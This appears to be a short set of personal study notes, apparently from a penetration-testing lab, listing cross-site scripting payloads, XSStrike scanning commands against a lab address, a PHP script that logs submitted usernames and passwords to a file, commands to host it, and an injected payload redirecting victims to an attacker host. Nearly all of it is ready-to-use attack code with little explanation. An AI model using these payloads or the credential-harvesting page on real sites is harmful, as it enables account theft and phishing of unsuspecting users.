# Stored XSS
# Reflected XSS

```js
<script>alert(document.cookie)</script>

```

# DOM XSS

```js

<img src="" onerror=alert(document.cookie)>

```

# XSS Discovery


```bash

git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py

python3 xsstrike.py -u "http://94.237.49.178:45588/?fullname=admin&username=admin&password=1234567&email=fran%40gamil.com"

```

# Phishing

```php

<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>

```


```bash

mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php #at this step we wrote our index.php file
sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started


```
" onerror="window.location.href='https://10.10.14.110:80/index.php;